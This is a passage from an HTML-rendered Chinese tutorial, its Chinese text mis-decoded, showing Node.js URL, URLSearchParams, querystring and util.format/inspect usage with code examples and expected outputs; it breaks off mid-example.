<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">port</span>);        <span class="hljs-comment">// '8080'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">pathname</span>);    <span class="hljs-comment">// '/p/a/t/h'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">search</span>);      <span class="hljs-comment">// '?query=string'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">hash</span>);        <span class="hljs-comment">// '#hash'</span>

<span class="hljs-comment">// ç›¸å¯¹ URLï¼ˆéœ€è¦æä¾› baseï¼‰</span>
<span class="hljs-keyword">const</span> baseURL = <span class="hljs-string">'https://example.org/foo/bar'</span>;
<span class="hljs-keyword">const</span> relativeURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'../baz'</span>, baseURL);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(relativeURL.<span class="hljs-property">href</span>);  <span class="hljs-comment">// 'https://example.org/foo/baz'</span>
</code></pre>
<h4 data-id="heading-19">URL å¯¹è±¡å±æ€§</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">URL</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);
<span class="hljs-keyword">const</span> myURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'https://user:pass@sub.example.com:8080/p/a/t/h?query=string#hash'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">protocol</span>);    <span class="hljs-comment">// 'https:'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">username</span>);    <span class="hljs-comment">// 'user'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">password</span>);    <span class="hljs-comment">// 'pass'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">host</span>);        <span class="hljs-comment">// 'sub.example.com:8080'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">hostname</span>);    <span class="hljs-comment">// 'sub.example.com'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">port</span>);        <span class="hljs-comment">// '8080'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">pathname</span>);    <span class="hljs-comment">// '/p/a/t/h'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">search</span>);      <span class="hljs-comment">// '?query=string'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">searchParams</span>); <span class="hljs-comment">// URLSearchParams å¯¹è±¡</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">hash</span>);        <span class="hljs-comment">// '#hash'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">origin</span>);      <span class="hljs-comment">// 'https://sub.example.com:8080'</span>
</code></pre>
<h4 data-id="heading-20"><code>URLSearchParams</code> - æŸ¥è¯¢å‚æ•°å¤„ç†</h4>
<p><code>URLSearchParams</code> æä¾›äº†å¼ºå¤§çš„æŸ¥è¯¢å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">URL</span>, <span class="hljs-title class_">URLSearchParams</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// ä» URL å¯¹è±¡è·å–æŸ¥è¯¢å‚æ•°</span>
<span class="hljs-keyword">const</span> myURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'https://example.com/?name=Kai&amp;age=30&amp;city=Beijing'</span>);
<span class="hljs-keyword">const</span> params = myURL.<span class="hljs-property">searchParams</span>;

<span class="hljs-comment">// è·å–å‚æ•°å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">get</span>(<span class="hljs-string">'name'</span>));     <span class="hljs-comment">// 'Kai'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">get</span>(<span class="hljs-string">'age'</span>));     <span class="hljs-comment">// '30'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">has</span>(<span class="hljs-string">'city'</span>));    <span class="hljs-comment">// true</span>

<span class="hljs-comment">// è®¾ç½®å‚æ•°</span>
params.<span class="hljs-title function_">set</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'31'</span>);
params.<span class="hljs-title function_">set</span>(<span class="hljs-string">'email'</span>, <span class="hljs-string">'kai@example.com'</span>);

<span class="hljs-comment">// è¿½åŠ å‚æ•°</span>
params.<span class="hljs-title function_">append</span>(<span class="hljs-string">'hobby'</span>, <span class="hljs-string">'coding'</span>);
params.<span class="hljs-title function_">append</span>(<span class="hljs-string">'hobby'</span>, <span class="hljs-string">'reading'</span>);

<span class="hljs-comment">// åˆ é™¤å‚æ•°</span>
params.<span class="hljs-title function_">delete</span>(<span class="hljs-string">'city'</span>);

<span class="hljs-comment">// è·å–æ‰€æœ‰å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">getAll</span>(<span class="hljs-string">'hobby'</span>)); <span class="hljs-comment">// ['coding', 'reading']</span>

<span class="hljs-comment">// éå†å‚æ•°</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> params) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${value}</span>`</span>);
}

<span class="hljs-comment">// è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">toString</span>());
<span class="hljs-comment">// è¾“å‡º: 'name=Kai&amp;age=31&amp;email=kai%40example.com&amp;hobby=coding&amp;hobby=reading'</span>

<span class="hljs-comment">// æ’åº</span>
params.<span class="hljs-title function_">sort</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params.<span class="hljs-title function_">toString</span>());
</code></pre>
<h4 data-id="heading-21">ç‹¬ç«‹ä½¿ç”¨ URLSearchParams</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">URLSearchParams</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// ä»å­—ç¬¦ä¸²åˆ›å»º</span>
<span class="hljs-keyword">const</span> params1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-string">'foo=bar&amp;abc=xyz&amp;abc=123'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params1.<span class="hljs-title function_">get</span>(<span class="hljs-string">'foo'</span>));      <span class="hljs-comment">// 'bar'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params1.<span class="hljs-title function_">getAll</span>(<span class="hljs-string">'abc'</span>));   <span class="hljs-comment">// ['xyz', '123']</span>

<span class="hljs-comment">// ä»å¯¹è±¡åˆ›å»º</span>
<span class="hljs-keyword">const</span> params2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>({
  <span class="hljs-attr">user</span>: <span class="hljs-string">'admin'</span>,
  <span class="hljs-attr">password</span>: <span class="hljs-string">'secret123'</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params2.<span class="hljs-title function_">toString</span>());     <span class="hljs-comment">// 'user=admin&amp;password=secret123'</span>

<span class="hljs-comment">// ä» Map åˆ›å»º</span>
<span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([
  [<span class="hljs-string">'name'</span>, <span class="hljs-string">'John'</span>],
  [<span class="hljs-string">'age'</span>, <span class="hljs-string">'30'</span>]
]);
<span class="hljs-keyword">const</span> params3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(map);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params3.<span class="hljs-title function_">toString</span>());      <span class="hljs-comment">// 'name=John&amp;age=30'</span>
</code></pre>
<h3 data-id="heading-22">2.3 å®ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">URL</span>, <span class="hljs-title class_">URLSearchParams</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// ç¤ºä¾‹1ï¼šæ„å»ºå¸¦æŸ¥è¯¢å‚æ•°çš„ URL</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildURL</span>(<span class="hljs-params">baseURL, params</span>) {
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(baseURL);
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(params).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
    url.<span class="hljs-property">searchParams</span>.<span class="hljs-title function_">set</span>(key, params[key]);
  });
  <span class="hljs-keyword">return</span> url.<span class="hljs-property">href</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">buildURL</span>(<span class="hljs-string">'https://api.example.com/users'</span>, {
  <span class="hljs-attr">page</span>: <span class="hljs-string">'1'</span>,
  <span class="hljs-attr">limit</span>: <span class="hljs-string">'10'</span>,
  <span class="hljs-attr">sort</span>: <span class="hljs-string">'name'</span>
}));
<span class="hljs-comment">// è¾“å‡º: 'https://api.example.com/users?page=1&amp;limit=10&amp;sort=name'</span>

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šè§£æå’Œä¿®æ”¹ URL</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">updateURLPort</span>(<span class="hljs-params">urlString, newPort</span>) {
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(urlString);
  url.<span class="hljs-property">port</span> = newPort;
  <span class="hljs-keyword">return</span> url.<span class="hljs-property">href</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">updateURLPort</span>(<span class="hljs-string">'https://example.com:8080/path'</span>, <span class="hljs-string">'3000'</span>));
<span class="hljs-comment">// è¾“å‡º: 'https://example.com:3000/path'</span>

<span class="hljs-comment">// ç¤ºä¾‹3ï¼šéªŒè¯ URL</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidURL</span>(<span class="hljs-params">str</span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(str);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isValidURL</span>(<span class="hljs-string">'https://example.com'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isValidURL</span>(<span class="hljs-string">'not-a-url'</span>));           <span class="hljs-comment">// false</span>

<span class="hljs-comment">// ç¤ºä¾‹4ï¼šæå–åŸŸå</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getDomain</span>(<span class="hljs-params">urlString</span>) {
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(urlString);
  <span class="hljs-keyword">return</span> url.<span class="hljs-property">hostname</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getDomain</span>(<span class="hljs-string">'https://www.example.com:8080/path?query=1'</span>));
<span class="hljs-comment">// è¾“å‡º: 'www.example.com'</span>
</code></pre>
<hr/>
<h2 data-id="heading-23">ä¸‰ã€querystring æ¨¡å—ï¼šæŸ¥è¯¢å­—ç¬¦ä¸²å¤„ç†</h2>
<p><code>querystring</code> æ¨¡å—æä¾›äº†ç”¨äºè§£æå’Œæ ¼å¼åŒ– URL æŸ¥è¯¢å­—ç¬¦ä¸²çš„å®ç”¨å·¥å…·ã€‚è™½ç„¶ <code>URLSearchParams</code> æ›´ç°ä»£ï¼Œä½† <code>querystring</code> æ¨¡å—åœ¨å¤„ç†è‡ªå®šä¹‰åˆ†éš”ç¬¦æ—¶ä»ç„¶æœ‰ç”¨ã€‚</p>
<h3 data-id="heading-24">3.1 å¼•å…¥æ¨¡å—</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);
</code></pre>
<h3 data-id="heading-25">3.2 å¸¸ç”¨æ–¹æ³•</h3>
<h4 data-id="heading-26"><code>querystring.parse(str[, sep[, eq[, options]]])</code> - è§£ææŸ¥è¯¢å­—ç¬¦ä¸²</h4>
<p>å°†æŸ¥è¯¢å­—ç¬¦ä¸²è§£æä¸ºå¯¹è±¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-keyword">const</span> qs = <span class="hljs-string">'year=2017&amp;month=february&amp;day=15'</span>;
<span class="hljs-keyword">const</span> parsed = querystring.<span class="hljs-title function_">parse</span>(qs);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed);
<span class="hljs-comment">// è¾“å‡º: { year: '2017', month: 'february', day: '15' }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed.<span class="hljs-property">year</span>);   <span class="hljs-comment">// '2017'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed.<span class="hljs-property">month</span>);   <span class="hljs-comment">// 'february'</span>

<span class="hljs-comment">// è‡ªå®šä¹‰åˆ†éš”ç¬¦</span>
<span class="hljs-keyword">const</span> customQS = <span class="hljs-string">'year:2017;month:february'</span>;
<span class="hljs-keyword">const</span> parsed2 = querystring.<span class="hljs-title function_">parse</span>(customQS, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed2);
<span class="hljs-comment">// è¾“å‡º: { year: '2017', month: 'february' }</span>

<span class="hljs-comment">// è§£ç é€‰é¡¹</span>
<span class="hljs-keyword">const</span> encodedQS = <span class="hljs-string">'name=John%20Doe&amp;city=New%20York'</span>;
<span class="hljs-keyword">const</span> parsed3 = querystring.<span class="hljs-title function_">parse</span>(encodedQS);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed3);
<span class="hljs-comment">// è¾“å‡º: { name: 'John Doe', city: 'New York' }</span>
</code></pre>
<h4 data-id="heading-27"><code>querystring.stringify(obj[, sep[, eq[, options]]])</code> - åºåˆ—åŒ–ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²</h4>
<p>å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">year</span>: <span class="hljs-number">2017</span>,
  <span class="hljs-attr">month</span>: <span class="hljs-string">'february'</span>,
  <span class="hljs-attr">day</span>: <span class="hljs-number">15</span>
};
<span class="hljs-keyword">const</span> qs = querystring.<span class="hljs-title function_">stringify</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(qs);
<span class="hljs-comment">// è¾“å‡º: 'year=2017&amp;month=february&amp;day=15'</span>

<span class="hljs-comment">// è‡ªå®šä¹‰åˆ†éš”ç¬¦</span>
<span class="hljs-keyword">const</span> customQS = querystring.<span class="hljs-title function_">stringify</span>(obj, <span class="hljs-string">';'</span>, <span class="hljs-string">':'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(customQS);
<span class="hljs-comment">// è¾“å‡º: 'year:2017;month:february;day:15'</span>

<span class="hljs-comment">// ç¼–ç é€‰é¡¹</span>
<span class="hljs-keyword">const</span> obj2 = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'John Doe'</span>,
  <span class="hljs-attr">city</span>: <span class="hljs-string">'New York'</span>
};
<span class="hljs-keyword">const</span> encodedQS = querystring.<span class="hljs-title function_">stringify</span>(obj2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(encodedQS);
<span class="hljs-comment">// è¾“å‡º: 'name=John%20Doe&amp;city=New%20York'</span>

<span class="hljs-comment">// å¤„ç†æ•°ç»„</span>
<span class="hljs-keyword">const</span> obj3 = {
  <span class="hljs-attr">tags</span>: [<span class="hljs-string">'nodejs'</span>, <span class="hljs-string">'javascript'</span>, <span class="hljs-string">'web'</span>]
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(querystring.<span class="hljs-title function_">stringify</span>(obj3));
<span class="hljs-comment">// è¾“å‡º: 'tags=nodejs&amp;tags=javascript&amp;tags=web'</span>
</code></pre>
<h4 data-id="heading-28"><code>querystring.escape(str)</code> - URL ç¼–ç </h4>
<p>å¯¹å­—ç¬¦ä¸²è¿›è¡Œ URL ç¼–ç ï¼ˆé€šå¸¸ä¸éœ€è¦ç›´æ¥è°ƒç”¨ï¼Œ<code>stringify</code> ä¼šè‡ªåŠ¨å¤„ç†ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(querystring.<span class="hljs-built_in">escape</span>(<span class="hljs-string">'hello world'</span>));
<span class="hljs-comment">// è¾“å‡º: 'hello%20world'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(querystring.<span class="hljs-built_in">escape</span>(<span class="hljs-string">'foo@bar.com'</span>));
<span class="hljs-comment">// è¾“å‡º: 'foo%40bar.com'</span>
</code></pre>
<h4 data-id="heading-29"><code>querystring.unescape(str)</code> - URL è§£ç </h4>
<p>å¯¹å­—ç¬¦ä¸²è¿›è¡Œ URL è§£ç ï¼ˆé€šå¸¸ä¸éœ€è¦ç›´æ¥è°ƒç”¨ï¼Œ<code>parse</code> ä¼šè‡ªåŠ¨å¤„ç†ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(querystring.<span class="hljs-built_in">unescape</span>(<span class="hljs-string">'hello%20world'</span>));
<span class="hljs-comment">// è¾“å‡º: 'hello world'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(querystring.<span class="hljs-built_in">unescape</span>(<span class="hljs-string">'foo%40bar.com'</span>));
<span class="hljs-comment">// è¾“å‡º: 'foo@bar.com'</span>
</code></pre>
<h3 data-id="heading-30">3.3 å®ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">'querystring'</span>);

<span class="hljs-comment">// ç¤ºä¾‹1ï¼šè§£æ URL æŸ¥è¯¢å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">parseQueryString</span>(<span class="hljs-params">urlString</span>) {
  <span class="hljs-keyword">const</span> queryString = urlString.<span class="hljs-title function_">split</span>(<span class="hljs-string">'?'</span>)[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;
  <span class="hljs-keyword">return</span> querystring.<span class="hljs-title function_">parse</span>(queryString);
}

<span class="hljs-keyword">const</span> url = <span class="hljs-string">'https://example.com/search?q=nodejs&amp;page=1&amp;limit=10'</span>;
<span class="hljs-keyword">const</span> params = <span class="hljs-title function_">parseQueryString</span>(url);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params);
<span class="hljs-comment">// è¾“å‡º: { q: 'nodejs', page: '1', limit: '10' }</span>

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šæ„å»ºæŸ¥è¯¢å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildQueryString</span>(<span class="hljs-params">params</span>) {
  <span class="hljs-keyword">return</span> querystring.<span class="hljs-title function_">stringify</span>(params);
}

<span class="hljs-keyword">const</span> searchParams = {
  <span class="hljs-attr">q</span>: <span class="hljs-string">'nodejs tutorial'</span>,
  <span class="hljs-attr">page</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">sort</span>: <span class="hljs-string">'relevance'</span>
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">buildQueryString</span>(searchParams));
<span class="hljs-comment">// è¾“å‡º: 'q=nodejs%20tutorial&amp;page=1&amp;sort=relevance'</span>

<span class="hljs-comment">// ç¤ºä¾‹3ï¼šåˆå¹¶æŸ¥è¯¢å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">mergeQueryParams</span>(<span class="hljs-params">baseParams, newParams</span>) {
  <span class="hljs-keyword">const</span> merged = { ...baseParams, ...newParams };
  <span class="hljs-keyword">return</span> querystring.<span class="hljs-title function_">stringify</span>(merged);
}

<span class="hljs-keyword">const</span> base = { <span class="hljs-attr">page</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">limit</span>: <span class="hljs-number">10</span> };
<span class="hljs-keyword">const</span> additional = { <span class="hljs-attr">sort</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">order</span>: <span class="hljs-string">'asc'</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">mergeQueryParams</span>(base, additional));
<span class="hljs-comment">// è¾“å‡º: 'page=1&amp;limit=10&amp;sort=name&amp;order=asc'</span>

<span class="hljs-comment">// ç¤ºä¾‹4ï¼šå¤„ç†åµŒå¥—å¯¹è±¡ï¼ˆéœ€è¦è‡ªå®šä¹‰åºåˆ—åŒ–ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">stringifyNested</span>(<span class="hljs-params">obj, prefix = <span class="hljs-string">''</span></span>) {
  <span class="hljs-keyword">const</span> pairs = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
    <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
      <span class="hljs-keyword">const</span> value = obj[key];
      <span class="hljs-keyword">const</span> newKey = prefix ? <span class="hljs-string">`<span class="hljs-subst">${prefix}</span>[<span class="hljs-subst">${key}</span>]`</span> : key;
      
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(value)) {
        pairs.<span class="hljs-title function_">push</span>(...<span class="hljs-title function_">stringifyNested</span>(value, newKey));
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(value)) {
        value.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
          pairs.<span class="hljs-title function_">push</span>(<span class="hljs-string">`<span class="hljs-subst">${newKey}</span>[<span class="hljs-subst">${index}</span>]=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(item)}</span>`</span>);
        });
      } <span class="hljs-keyword">else</span> {
        pairs.<span class="hljs-title function_">push</span>(<span class="hljs-string">`<span class="hljs-subst">${newKey}</span>=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(value)}</span>`</span>);
      }
    }
  }
  <span class="hljs-keyword">return</span> pairs;
}

<span class="hljs-keyword">const</span> nested = {
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>
  },
  <span class="hljs-attr">tags</span>: [<span class="hljs-string">'nodejs'</span>, <span class="hljs-string">'javascript'</span>]
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">stringifyNested</span>(nested).<span class="hljs-title function_">join</span>(<span class="hljs-string">'&amp;'</span>));
<span class="hljs-comment">// è¾“å‡º: 'user[name]=John&amp;user[age]=30&amp;tags[0]=nodejs&amp;tags[1]=javascript'</span>
</code></pre>
<hr/>
<h2 data-id="heading-31">å››ã€util æ¨¡å—ï¼šå·¥å…·å‡½æ•°</h2>
<p><code>util</code> æ¨¡å—æä¾›äº†å¤šç§å®ç”¨å·¥å…·å‡½æ•°ï¼Œå¸®åŠ©å¼€å‘è€…å¤„ç†å¸¸è§çš„ç¼–ç¨‹ä»»åŠ¡ï¼Œå¦‚ç±»å‹æ£€æŸ¥ã€è°ƒè¯•ã€Promise è½¬æ¢ç­‰ã€‚</p>
<h3 data-id="heading-32">4.1 å¼•å…¥æ¨¡å—</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
</code></pre>
<h3 data-id="heading-33">4.2 å¸¸ç”¨æ–¹æ³•</h3>
<h4 data-id="heading-34"><code>util.format(format[, ...args])</code> - æ ¼å¼åŒ–å­—ç¬¦ä¸²</h4>
<p>è¿”å›æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²ï¼Œç±»ä¼¼äº C è¯­è¨€çš„ <code>printf</code> å‡½æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">format</span>(<span class="hljs-string">'%s:%s'</span>, <span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>));
<span class="hljs-comment">// è¾“å‡º: 'foo:bar'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">format</span>(<span class="hljs-string">'%d + %d = %d'</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>));
<span class="hljs-comment">// è¾“å‡º: '1 + 2 = 3'</span>

<span class="hljs-comment">// å ä½ç¬¦</span>
<span class="hljs-comment">// %s - å­—ç¬¦ä¸²</span>
<span class="hljs-comment">// %d - æ•°å­—ï¼ˆæ•´æ•°æˆ–æµ®ç‚¹æ•°ï¼‰</span>
<span class="hljs-comment">// %j - JSON</span>
<span class="hljs-comment">// %% - ç™¾åˆ†å·</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">format</span>(<span class="hljs-string">'Name: %s, Age: %d, Data: %j'</span>, <span class="hljs-string">'John'</span>, <span class="hljs-number">30</span>, { <span class="hljs-attr">city</span>: <span class="hljs-string">'NYC'</span> }));
<span class="hljs-comment">// è¾“å‡º: 'Name: John, Age: 30, Data: {"city":"NYC"}'</span>

<span class="hljs-comment">// å¦‚æœæ²¡æœ‰æä¾›æ ¼å¼å­—ç¬¦ä¸²ï¼Œåˆ™å°†æ‰€æœ‰å‚æ•°ç”¨ç©ºæ ¼è¿æ¥</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">format</span>(<span class="hljs-string">'Hello'</span>, <span class="hljs-string">'World'</span>, <span class="hljs-number">123</span>));
<span class="hljs-comment">// è¾“å‡º: 'Hello World 123'</span>
</code></pre>
<h4 data-id="heading-35"><code>util.inspect(object[, options])</code> - å¯¹è±¡æ£€æŸ¥</h4>
<p>è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ã€‚è¿™æ˜¯ <code>console.log</code> å†…éƒ¨ä½¿ç”¨çš„æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);

<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,
